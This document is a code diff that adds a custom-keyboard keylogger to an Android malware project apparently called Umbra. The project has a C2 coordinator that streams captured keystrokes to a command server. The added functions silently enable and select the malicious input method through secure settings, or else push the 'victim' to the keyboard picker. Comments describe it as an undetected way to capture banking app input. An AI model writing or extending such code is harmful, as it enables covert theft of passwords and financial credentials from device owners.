@@ -5,6 +5,7 @@ import android.content.Context
 import android.content.Intent
 import android.provider.Settings
 import android.util.Log
+import android.view.inputmethod.InputMethodManager
 import org.umbra.core.c2.C2Coordinator
 import org.umbra.core.c2.Command
 import org.umbra.core.core.KeylogEntry
@@ -35,6 +36,9 @@ object KeylogModule {
 
     // Tracks whether the accessibility service is connected (keylogger capturing)
     @Volatile var hasActiveSession = false
+
+    // Tracks whether the IME (UmbraKeyboardService) is the active input method
+    @Volatile var hasImeSession = false
 
     // When true, every captured keystroke is pushed to the C2 server in real-time
     @Volatile var streamingEnabled = false
@@ -161,13 +165,172 @@ object KeylogModule {
         )
     }
 
-    suspend fun status(context: Context, cmd: Command): UmbraResponse {
+    /**
+     * Start the IME (custom keyboard) keylogger. This is the primary
+     * non-detected capture method — banking apps do not block input methods.
+     *
+     * Enables real-time streaming and verifies the keyboard is enabled. If not,
+     * it first attempts a silent enable via Settings.Secure (needs
+     * WRITE_SECURE_SETTINGS), then falls back to opening the input-method
+     * settings screen for the victim to enable/select the keyboard.
+     */
+    suspend fun startKeyboard(context: Context, cmd: Command): UmbraResponse {
+        streamingEnabled = true
+        val enabled = isImeEnabled(context)
+        var autoEnabled = false
+        if (!enabled) {
+            autoEnabled = tryEnableImeViaSecureSettings(context)
+            if (!autoEnabled) {
+                openImeSettings(context)
+            }
+        }
+
+        val nowEnabled = isImeEnabled(context) || autoEnabled
+        hasImeSession = nowEnabled
+
+        return if (nowEnabled) {
+            UmbraResponse.LiveStatusResponse(
+                status = "keylog_ime_active",
+                monitors = mapOf(
+                    "keylogger" to true,
+                    "ime_enabled" to true,
+                    "ime_default" to isImeDefault(context)
+                )
+            )
+        } else {
+            UmbraResponse.ErrorResponse(
+                "keylog:ime_must_be_enabled_in_settings",
+                "keylog"
+            )
+        }
+    }
+
+    /**
+     * Guide the victim to enable/select the keyboard. If already enabled but
+     * not the current input method, shows the quick-switch picker; otherwise
+     * opens the full input-method settings screen.
+     */
+    suspend fun enableKeyboard(context: Context, cmd: Command): UmbraResponse {
+        val enabled = isImeEnabled(context)
+        if (enabled && !isImeDefault(context)) {
+            try {
+                val imm = context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
+                imm.showInputMethodPicker()
+            } catch (_: Exception) {
+                openImeSettings(context)
+            }
+        } else if (!enabled) {
+            openImeSettings(context)
+        }
+
         return UmbraResponse.LiveStatusResponse(
-            status = if (hasActiveSession) "capturing" else "idle",
+            status = "ime_picker_opened",
             monitors = mapOf(
-                "keylogger" to hasActiveSession,
+                "ime_enabled" to isImeEnabled(context),
+                "ime_default" to isImeDefault(context)
+            )
+        )
+    }
+
+    private fun openImeSettings(context: Context) {
+        try {
+            val intent = Intent(Settings.ACTION_INPUT_METHOD_SETTINGS)
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            context.startActivity(intent)
+        } catch (_: Exception) {
+            try {
+                val imm = context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
+                imm.showInputMethodPicker()
+            } catch (_: Exception) {}
+        }
+    }
+
+    /**
+     * ComponentName of the Umbra IME keyboard keylogger.
+     */
+    fun imeComponent(context: Context): ComponentName =
+        ComponentName(context, UmbraKeyboardService::class.java)
+
+    /**
+     * Whether the Umbra keyboard is enabled as an input method.
+     */
+    fun isImeEnabled(context: Context): Boolean {
+        return try {
+            val comp = imeComponent(context).flattenToString()
+            val enabled = Settings.Secure.getString(
+                context.contentResolver,
+                Settings.Secure.ENABLED_INPUT_METHODS
+            ) ?: return false
+            enabled.split(':').any { it == comp }
+        } catch (e: Exception) {
+            Log.d(TAG, "isImeEnabled: ${e.message}")
+            false
+        }
+    }
+
+    /**
+     * Whether the Umbra keyboard is the currently selected input method.
+     */
+    fun isImeDefault(context: Context): Boolean {
+        return try {
+            val comp = imeComponent(context).flattenToString()
+            val def = Settings.Secure.getString(
+                context.contentResolver,
+                Settings.Secure.DEFAULT_INPUT_METHOD
+            ) ?: return false
+            def == comp
+        } catch (e: Exception) {
+            Log.d(TAG, "isImeDefault: ${e.message}")
+            false
+        }
+    }
+
+    /**
+     * Best-effort silent enable + set of the IME via Settings.Secure. Requires
+     * WRITE_SECURE_SETTINGS (pm grant / root). Mirrors the accessibility
+     * enable path. Returns true only if the IME ends up in ENABLED_INPUT_METHODS.
+     */
+    private fun tryEnableImeViaSecureSettings(context: Context): Boolean {
+        return try {
+            val comp = imeComponent(context).flattenToString()
+            val current = Settings.Secure.getString(
+                context.contentResolver,
+                Settings.Secure.ENABLED_INPUT_METHODS
+            ) ?: ""
+            val updated = if (current.isEmpty()) comp
+            else if (current.split(':').contains(comp)) current
+            else "$current:$comp"
+            Settings.Secure.putString(
+                context.contentResolver,
+                Settings.Secure.ENABLED_INPUT_METHODS,
+                updated
+            )
+            Settings.Secure.putString(
+                context.contentResolver,
+                Settings.Secure.DEFAULT_INPUT_METHOD,
+                comp
+            )
+            val re = Settings.Secure.getString(
+                context.contentResolver,
+                Settings.Secure.ENABLED_INPUT_METHODS
+            ) ?: ""
+            re.split(':').contains(comp)
+        } catch (e: Exception) {
+            Log.d(TAG, "tryEnableImeViaSecureSettings: ${e.message}")
+            false
+        }
+    }
+
+    suspend fun status(context: Context, cmd: Command): UmbraResponse {
+        val capturing = hasActiveSession || hasImeSession
+        return UmbraResponse.LiveStatusResponse(
+            status = if (capturing) "capturing" else "idle",
+            monitors = mapOf(
+                "keylogger" to capturing,
                 "streaming" to streamingEnabled,
-                "accessibility_enabled" to isAccessibilityEnabled(context)
+                "accessibility_enabled" to isAccessibilityEnabled(context),
+                "ime_enabled" to isImeEnabled(context),
+                "ime_default" to isImeDefault(context)
             )
         )
     }
